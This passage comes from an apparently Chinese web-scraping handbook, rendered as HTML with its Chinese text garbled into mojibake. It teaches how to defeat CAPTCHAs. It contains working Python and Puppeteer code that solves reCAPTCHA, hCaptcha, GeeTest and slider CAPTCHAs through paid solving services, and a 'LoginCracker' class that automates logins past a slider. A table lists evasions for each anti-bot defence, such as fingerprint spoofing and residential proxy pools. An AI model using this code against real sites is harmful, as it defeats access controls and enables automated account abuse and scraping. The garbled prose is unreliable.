<span class="c1"># åˆ‡å›ä¸»é¡µé¢è·å– token</span>
<span class="n">driver</span><span class="o">.</span><span class="n">switch_to</span><span class="o">.</span><span class="n">default_content</span><span class="p">()</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s1">&#39;g-recaptcha-response&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s1">&#39;value&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;reCAPTCHA Token: </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="4-å•†ä¸šæ‰“ç å¹³å°å¯¹æ¯”">4. å•†ä¸šæ‰“ç å¹³å°å¯¹æ¯”</h2>

      <p>å½“æŠ€æœ¯æ–¹æ¡ˆæˆæœ¬è¿‡é«˜æˆ–æˆåŠŸç‡ä¸ç¨³å®šæ—¶ï¼Œå•†ä¸šæ‰“ç å¹³å°æ˜¯æœ€ä½³é€‰æ‹©ã€‚</p>

      <table>
        <thead>
          <tr>
            <th>å¹³å°</th>
            <th>ä»·æ ¼</th>
            <th>æ”¯æŒç±»å‹</th>
            <th>æˆåŠŸç‡</th>
            <th>å“åº”æ—¶é—´</th>
            <th>API å‹å¥½åº¦</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong><a href="https://2captcha.com/">2Captcha</a></strong></td>
            <td>$2.99/1000æ¬¡</td>
            <td>æ–‡å­—ã€reCAPTCHAã€hCaptchaã€GeeTest</td>
            <td>90%+</td>
            <td>10-30ç§’</td>
            <td>â­â­â­â­â­</td>
          </tr>
          <tr>
            <td><strong><a href="https://anti-captcha.com/">Anti-Captcha</a></strong></td>
            <td>$2.00/1000æ¬¡</td>
            <td>å…¨ç±»å‹</td>
            <td>92%+</td>
            <td>15-40ç§’</td>
            <td>â­â­â­â­â­</td>
          </tr>
          <tr>
            <td><strong><a href="https://www.capsolver.com/">CapSolver</a></strong></td>
            <td>$0.80/1000æ¬¡</td>
            <td>reCAPTCHAã€hCaptchaã€FunCaptcha</td>
            <td>88%+</td>
            <td>20-50ç§’</td>
            <td>â­â­â­â­</td>
          </tr>
          <tr>
            <td><strong><a href="https://www.deathbycaptcha.com/">Death By Captcha</a></strong></td>
            <td>$1.39/1000æ¬¡</td>
            <td>æ–‡å­—ã€å›¾ç‰‡</td>
            <td>85%+</td>
            <td>30-60ç§’</td>
            <td>â­â­â­</td>
          </tr>
          <tr>
            <td><strong><a href="https://jytong.net/">æéªŒé€š</a></strong> (å›½å†…)</td>
            <td>Â¥0.5/æ¬¡</td>
            <td>æéªŒä¸“ç”¨</td>
            <td>95%+</td>
            <td>5-15ç§’</td>
            <td>â­â­â­â­</td>
          </tr>
          <tr>
            <td><strong><a href="https://www.chaojiying.com/">è¶…çº§é¹°</a></strong> (å›½å†…)</td>
            <td>Â¥0.1-0.6/æ¬¡</td>
            <td>å›½å†…éªŒè¯ç </td>
            <td>80%+</td>
            <td>10-30ç§’</td>
            <td>â­â­â­</td>
          </tr>
        </tbody>
      </table>

      <h3 id="41-2captcha-ä½¿ç”¨ç¤ºä¾‹">4.1 2Captcha ä½¿ç”¨ç¤ºä¾‹</h3>

      <p><strong>Python SDK</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>2captcha-python
</code></pre>
      </div>

      <p><strong>ä»£ç ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">twocaptcha</span><span class="w"> </span><span class="kn">import</span> <span class="n">TwoCaptcha</span>

<span class="c1"># åˆå§‹åŒ–</span>
<span class="n">solver</span> <span class="o">=</span> <span class="n">TwoCaptcha</span><span class="p">(</span><span class="s1">&#39;YOUR_API_KEY&#39;</span><span class="p">)</span>

<span class="c1"># 1. æ–‡å­—éªŒè¯ç </span>
<span class="n">result</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">normal</span><span class="p">(</span><span class="s1">&#39;captcha.png&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])</span>  <span class="c1"># è¾“å‡º: &quot;AB3CD&quot;</span>

<span class="c1"># 2. reCAPTCHA v2</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">recaptcha</span><span class="p">(</span>
    <span class="n">sitekey</span><span class="o">=</span><span class="s1">&#39;6Le-wvkSAAAAAPBMRTvw0Q4Muexq9bi0DJwx_mJ-&#39;</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://example.com/login&#39;</span>
<span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])</span>  <span class="c1"># reCAPTCHA token</span>

<span class="c1"># 3. hCaptcha</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">hcaptcha</span><span class="p">(</span>
    <span class="n">sitekey</span><span class="o">=</span><span class="s1">&#39;10000000-ffff-ffff-ffff-000000000001&#39;</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://example.com&#39;</span>
<span class="p">)</span>

<span class="c1"># 4. GeeTest</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">geetest</span><span class="p">(</span>
    <span class="n">gt</span><span class="o">=</span><span class="s1">&#39;geetest_gt&#39;</span><span class="p">,</span>
    <span class="n">challenge</span><span class="o">=</span><span class="s1">&#39;geetest_challenge&#39;</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s1">&#39;https://example.com&#39;</span>
<span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>  <span class="c1"># {&#39;challenge&#39;: &#39;...&#39;, &#39;validate&#39;: &#39;...&#39;, &#39;seccode&#39;: &#39;...&#39;}</span>
</code></pre>
      </div>

      <hr />

      <h3 id="42-è‡ªå»ºæ‰“ç å¹³å°">4.2 è‡ªå»ºæ‰“ç å¹³å°</h3>

      <p>å¯¹äºå¤§è§„æ¨¡éœ€æ±‚ï¼Œå¯ä»¥è€ƒè™‘è‡ªå»ºäººå·¥æ‰“ç å¹³å°ï¼š</p>

      <p><strong>æ¶æ„</strong>:</p>

      <pre><code>çˆ¬è™«æœåŠ¡å™¨ â†’ ä»»åŠ¡é˜Ÿåˆ— (Redis) â†’ æ‰“ç å·¥ä½œå° (Web) â†’ æ‰“ç å‘˜
</code></pre>

      <p><strong>æˆæœ¬ä¼°ç®—</strong>:</p>

      <ul>
        <li>æ‰“ç å‘˜å·¥èµ„: Â¥0.05-0.10/æ¬¡</li>
        <li>æœåŠ¡å™¨æˆæœ¬: Â¥200/æœˆ</li>
        <li>é€‚ç”¨åœºæ™¯: æ—¥å¤„ç†é‡ &gt; 100,000 æ¬¡</li>
      </ul>

      <hr />

      <h2 id="5-å®æˆ˜æ¡ˆä¾‹">5. å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹-1-ç ´è§£æŸç”µå•†ç½‘ç«™ç™»å½•æ»‘å—">æ¡ˆä¾‹ 1: ç ´è§£æŸç”µå•†ç½‘ç«™ç™»å½•æ»‘å—</h3>

      <p><strong>ç›®æ ‡</strong>: è‡ªåŠ¨åŒ–ç™»å½•å¹¶è·å– Cookie</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>
          <p><strong>åˆ†æéªŒè¯æµç¨‹</strong>:</p>

          <pre><code>1) POST /api/login â†’ è¿”å›éœ€è¦éªŒè¯
2) GET /captcha/init â†’ è·å–èƒŒæ™¯å›¾å’Œæ»‘å—
3) è¯†åˆ«ç¼ºå£ä½ç½®
4) ç”Ÿæˆè½¨è¿¹
5) POST /captcha/verify â†’ æäº¤è½¨è¿¹
6) éªŒè¯é€šè¿‡åé‡æ–°ç™»å½•
</code></pre>
        </li>
        <li>
          <p><strong>å®Œæ•´ä»£ç </strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">ddddocr</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">trajectory</span><span class="w"> </span><span class="kn">import</span> <span class="n">generate_trajectory</span>

<span class="k">class</span><span class="w"> </span><span class="nc">LoginCracker</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">det</span> <span class="o">=</span> <span class="n">ddddocr</span><span class="o">.</span><span class="n">DdddOcr</span><span class="p">(</span><span class="n">det</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="c1"># 1. å°è¯•ç™»å½•</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://example.com/api/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span>
        <span class="p">})</span>

        <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;need_captcha&#39;</span><span class="p">]:</span>
            <span class="c1"># 2. éœ€è¦éªŒè¯ç </span>
            <span class="n">captcha_token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">solve_captcha</span><span class="p">()</span>

            <span class="c1"># 3. å¸¦éªŒè¯ç é‡æ–°ç™»å½•</span>
            <span class="n">resp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://example.com/api/login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
                <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
                <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
                <span class="s1">&#39;captcha_token&#39;</span><span class="p">:</span> <span class="n">captcha_token</span>
            <span class="p">})</span>

        <span class="k">return</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">solve_captcha</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># è·å–éªŒè¯ç å›¾ç‰‡</span>
        <span class="n">init_resp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/captcha/init&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
        <span class="n">bg_url</span> <span class="o">=</span> <span class="n">init_resp</span><span class="p">[</span><span class="s1">&#39;bg_url&#39;</span><span class="p">]</span>

        <span class="c1"># ä¸‹è½½èƒŒæ™¯å›¾</span>
        <span class="n">bg_img</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">bg_url</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>

        <span class="c1"># è¯†åˆ«ç¼ºå£</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">det</span><span class="o">.</span><span class="n">detection</span><span class="p">(</span><span class="n">bg_img</span><span class="p">)</span>
        <span class="n">gap_x</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>

        <span class="c1"># ç”Ÿæˆè½¨è¿¹</span>
        <span class="n">trajectory</span> <span class="o">=</span> <span class="n">generate_trajectory</span><span class="p">(</span><span class="n">gap_x</span><span class="p">)</span>

        <span class="c1"># æäº¤éªŒè¯</span>
        <span class="n">verify_resp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://example.com/captcha/verify&#39;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
            <span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">init_resp</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">],</span>
            <span class="s1">&#39;trajectory&#39;</span><span class="p">:</span> <span class="n">trajectory</span>
        <span class="p">})</span>

        <span class="k">return</span> <span class="n">verify_resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;captcha_token&#39;</span><span class="p">]</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">cracker</span> <span class="o">=</span> <span class="n">LoginCracker</span><span class="p">()</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">cracker</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</code></pre>
          </div>
        </li>
      </ol>

      <hr />

      <h3 id="æ¡ˆä¾‹-2-ä½¿ç”¨-puppeteer-2captcha-ç ´è§£-recaptcha">æ¡ˆä¾‹ 2: ä½¿ç”¨ Puppeteer + 2Captcha ç ´è§£ reCAPTCHA</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">puppeteer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;puppeteer&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">solver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;2captcha&#39;</span><span class="p">);</span>

<span class="p">(</span><span class="k">async</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span><span class="w"> </span><span class="nx">headless</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">});</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">newPage</span><span class="p">();</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com/login&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è·å– reCAPTCHA sitekey</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">sitekey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;[data-sitekey]&#39;</span><span class="p">).</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s1">&#39;data-sitekey&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// è°ƒç”¨ 2Captcha è§£å†³</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">captchaSolver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">solver</span><span class="p">.</span><span class="nx">Solver</span><span class="p">(</span><span class="s1">&#39;YOUR_API_KEY&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">captchaSolver</span><span class="p">.</span><span class="nx">recaptcha</span><span class="p">(</span><span class="nx">sitekey</span><span class="p">,</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">url</span><span class="p">());</span>

<span class="w">    </span><span class="c1">// æ³¨å…¥ token</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">((</span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;g-recaptcha-response&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
<span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="nx">result</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æäº¤è¡¨å•</span>
<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">click</span><span class="p">(</span><span class="s1">&#39;#submit-button&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForNavigation</span><span class="p">();</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ç™»å½•æˆåŠŸ!&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="6-é˜²å¾¡å¯¹æŠ—">6. é˜²å¾¡å¯¹æŠ—</h2>

      <h3 id="61-éªŒè¯ç æœåŠ¡å•†çš„é˜²å¾¡æ‰‹æ®µ">6.1 éªŒè¯ç æœåŠ¡å•†çš„é˜²å¾¡æ‰‹æ®µ</h3>

      <table>
        <thead>
          <tr>
            <th>é˜²å¾¡æ‰‹æ®µ</th>
            <th>è¯´æ˜</th>
            <th>å¯¹æŠ—æ–¹æ³•</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>è®¾å¤‡æŒ‡çº¹</strong></td>
            <td>Canvasã€WebGLã€AudioContext</td>
            <td>Puppeteer Stealth æ’ä»¶</td>
          </tr>
          <tr>
            <td><strong>è¡Œä¸ºåˆ†æ</strong></td>
            <td>é¼ æ ‡è½¨è¿¹ã€é”®ç›˜èŠ‚å¥</td>
            <td>ghost-cursorã€çœŸå®è½¨è¿¹é‡æ”¾</td>
          </tr>
          <tr>
            <td><strong>IP é£æ§</strong></td>
            <td>é¢‘ç‡é™åˆ¶ã€é»‘åå•</td>
            <td>ä»£ç†æ± ã€ä½å®…IP</td>
          </tr>
          <tr>
            <td><strong>Token ç»‘å®š</strong></td>
            <td>ä»¤ç‰Œä¸è®¾å¤‡/ä¼šè¯ç»‘å®š</td>
            <td>ä¿æŒ Sessionã€Cookie</td>
          </tr>
          <tr>
            <td><strong>æ—¶é—´æˆ³æ ¡éªŒ</strong></td>
            <td>é™åˆ¶éªŒè¯ç æœ‰æ•ˆæœŸ</td>
            <td>åŠ å¿«è¯†åˆ«é€Ÿåº¦</td>
          </tr>
          <tr>
            <td><strong>é‡æ”¾æ£€æµ‹</strong></td>
            <td>æ£€æµ‹è½¨è¿¹æ˜¯å¦é‡å¤</td>
            <td>æ¯æ¬¡ç”Ÿæˆæ–°è½¨è¿¹</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="62-æœ€ä½³å®è·µ">6.2 æœ€ä½³å®è·µ</h3>

      <ol>
        <li><strong>ç»„åˆç­–ç•¥</strong>: è¯†åˆ« + æ‰“ç å¹³å° (è¯†åˆ«å¤±è´¥æ—¶é™çº§)</li>
        <li><strong>é€Ÿç‡æ§åˆ¶</strong>: é¿å…çŸ­æ—¶é—´å¤§é‡è¯·æ±‚</li>
        <li><strong>çœŸå®ç¯å¢ƒ</strong>: ä½¿ç”¨çœŸå®æµè§ˆå™¨è€Œéæ— å¤´æ¨¡å¼</li>
        <li><strong>è½¨è¿¹å¤šæ ·æ€§</strong>: ä¸è¦ä½¿ç”¨å›ºå®šè½¨è¿¹æ¨¡æ¿</li>
        <li><strong>å¼‚å¸¸å¤„ç†</strong>: éªŒè¯å¤±è´¥æ—¶é‡è¯•è€Œéå´©æºƒ</li>
      </ol>

      <hr />

      <h2 id="7-å¸¸è§é—®é¢˜">7. å¸¸è§é—®é¢˜</h2>

      <h3 id="q1-ddddocr-è¯†åˆ«ç‡ä¸é«˜æ€ä¹ˆåŠ">Q1: ddddocr è¯†åˆ«ç‡ä¸é«˜æ€ä¹ˆåŠï¼Ÿ</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <ul>
        <li>å›¾åƒé¢„å¤„ç†ï¼šå»å™ªã€äºŒå€¼åŒ–ã€å¢å¼ºå¯¹æ¯”åº¦</li>
        <li>å°è¯•ä¸åŒçš„ OCR å·¥å…·å¯¹æ¯”</li>
        <li>è€ƒè™‘ä½¿ç”¨æ‰“ç å¹³å°</li>
      </ul>

      <h3 id="q2-æ»‘å—æ€»æ˜¯éªŒè¯å¤±è´¥">Q2: æ»‘å—æ€»æ˜¯éªŒè¯å¤±è´¥ï¼Ÿ</h3>

      <p><strong>å¯èƒ½åŸå› </strong>:</p>

      <ul>
        <li>ç¼ºå£è¯†åˆ«ä¸å‡†ç¡®</li>
        <li>è½¨è¿¹å¤ªå‡ï¼ˆåŒ€é€Ÿç›´çº¿ï¼‰</li>
        <li>è®¾å¤‡æŒ‡çº¹è¢«è¯†åˆ«</li>
        <li>IP è¢«é£æ§</li>
      </ul>

      <p><strong>è°ƒè¯•æ–¹æ³•</strong>:</p>

      <ul>
        <li>åœ¨æµè§ˆå™¨ä¸­æ‰‹åŠ¨éªŒè¯æ˜¯å¦é€šè¿‡</li>
        <li>æ£€æŸ¥ Network é¢æ¿çš„éªŒè¯å“åº”</li>
        <li>å¯¹æ¯”çœŸäººæ»‘åŠ¨çš„è½¨è¿¹</li>
      </ul>

      <h3 id="q3-æ‰“ç å¹³å°å“åº”å¤ªæ…¢">Q3: æ‰“ç å¹³å°å“åº”å¤ªæ…¢ï¼Ÿ</h3>

      <p><strong>ä¼˜åŒ–æ–¹æ³•</strong>:</p>

      <ul>
        <li>ä½¿ç”¨å¼‚æ­¥å¹¶å‘</li>
        <li>é¢„å…ˆè¯†åˆ«ç®€å•éªŒè¯ç ï¼Œå¤æ‚çš„æ‰ç”¨æ‰“ç </li>
        <li>é€‰æ‹©å“åº”æ›´å¿«çš„å¹³å°ï¼ˆå¦‚æéªŒé€šï¼‰</li>
      </ul>

      <hr />

      <h2 id="8-å·¥å…·ä¸èµ„æº">8. å·¥å…·ä¸èµ„æº</h2>

      <h3 id="æ¨èå·¥å…·">æ¨èå·¥å…·</h3>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>ç”¨é€”</th>
            <th>é“¾æ¥</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>ddddocr</strong></td>
            <td>ä¸­æ–‡éªŒè¯ç  OCR</td>
            <td>https://github.com/sml2h3/ddddocr</td>
          </tr>
          <tr>
            <td><strong>YOLOv8</strong></td>
            <td>ç›®æ ‡æ£€æµ‹</td>
            <td>https://github.com/ultralytics/ultralytics</td>
          </tr>
          <tr>
            <td><strong>ghost-cursor</strong></td>
            <td>è‡ªç„¶é¼ æ ‡è½¨è¿¹</td>
            <td>https://github.com/Xetera/ghost-cursor</td>
          </tr>
          <tr>
            <td><strong>2Captcha</strong></td>
            <td>å•†ä¸šæ‰“ç å¹³å°</td>
            <td>https://2captcha.com/</td>
          </tr>
          <tr>
            <td><strong>hcaptcha-solver</strong></td>
            <td>hCaptcha è‡ªåŠ¨æ±‚è§£</td>
            <td>https://github.com/QIN2DIM/hcaptcha-challenger</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="9-æ€»ç»“">9. æ€»ç»“</h2>

      <p>éªŒè¯ç å¯¹æŠ—æ˜¯ä¸€åœº<strong>æ°¸æ’çš„çŒ«é¼ æ¸¸æˆ</strong>ã€‚æŠ€æœ¯è·¯çº¿é€‰æ‹©å–å†³äºï¼š</p>

      <ul>
        <li><strong>ä¸ªäººå­¦ä¹ </strong>: æ‰‹åŠ¨è¯†åˆ« + è½¨è¿¹æ¨¡æ‹Ÿï¼ˆddddocr + è´å¡å°”æ›²çº¿ï¼‰</li>
        <li><strong>å°è§„æ¨¡çˆ¬è™«</strong>: æ‰“ç å¹³å°ï¼ˆ2Captchaã€è¶…çº§é¹°ï¼‰</li>
        <li><strong>å¤§è§„æ¨¡å•†ä¸š</strong>: æ·±åº¦å­¦ä¹  + è¡Œä¸ºä¼ªé€  + åˆ†å¸ƒå¼æ¶æ„</li>
        <li><strong>ç»ˆææ–¹æ¡ˆ</strong>: çœŸå®è®¾å¤‡ + çœŸå®ç”¨æˆ·è¡Œä¸º + æŒ‡çº¹ä¼ªé€ </li>
      </ul>

      <p><strong>æ ¸å¿ƒåŸåˆ™</strong>:</p>

      <ol>
        <li><strong>æˆæœ¬ä¼˜å…ˆ</strong>: é€‰æ‹©æ€§ä»·æ¯”æœ€é«˜çš„æ–¹æ¡ˆ</li>
        <li><strong>ç¨³å®šæ€§ä¼˜å…ˆ</strong>: ç‰ºç‰²ä¸€å®šé€Ÿåº¦æ¢å–æˆåŠŸç‡</li>
        <li><strong>åˆæ³•åˆè§„</strong>: éµå®ˆç›®æ ‡ç½‘ç«™çš„æœåŠ¡æ¡æ¬¾</li>
        <li><strong>æŒç»­ä¼˜åŒ–</strong>: éªŒè¯ç åœ¨å‡çº§ï¼Œæ–¹æ¡ˆä¹Ÿè¦è¿­ä»£</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#07-Scripts-automation-scripts">æµè§ˆå™¨è‡ªåŠ¨åŒ–è„šæœ¬</a></li>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#02-Tooling-puppeteer-playwright">Puppeteer ä¸ Playwright</a></li>
        <li><a href="#03-Basic-Recipes-dynamic-parameter-analysis">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-browser-fingerprinting">
      <h2>34. Browser Fingerprinting</h2>
      <h1 id="æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æµè§ˆå™¨æŒ‡çº¹ï¼ˆBrowser Fingerprintingï¼‰æ˜¯ä¸€ç§é€šè¿‡æ”¶é›†æµè§ˆå™¨å’Œè®¾å¤‡çš„å„ç§ç‰¹å¾æ¥å”¯ä¸€æ ‡è¯†ç”¨æˆ·çš„æŠ€æœ¯ã€‚å³ä½¿ç”¨æˆ·æ¸…é™¤Cookieæˆ–ä½¿ç”¨éšèº«æ¨¡å¼ï¼Œä»ç„¶å¯ä»¥é€šè¿‡æŒ‡çº¹è¿½è¸ªã€‚</p>

      <hr />

      <h2 id="æŒ‡çº¹ç»„æˆè¦ç´ ">æŒ‡çº¹ç»„æˆè¦ç´ </h2>

      <h3 id="1-user-agent">1. User-Agent</h3>

      <p>æœ€åŸºç¡€çš„æŒ‡çº¹ä¿¡æ¯ï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨ç‰ˆæœ¬ç­‰ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span>
<span class="c1">// &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...&quot;</span>
</code></pre>
      </div>

      <h3 id="2-screen-ä¿¡æ¯">2. Screen ä¿¡æ¯</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">screenInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">width</span><span class="o">:</span><span class="w"> </span><span class="nx">screen</span><span class="p">.</span><span class="nx">width</span><span class="p">,</span>
<span class="w">    </span><span class="nx">height</span><span class="o">:</span><span class="w"> </span><span class="nx">screen</span><span class="p">.</span><span class="nx">height</span><span class="p">,</span>
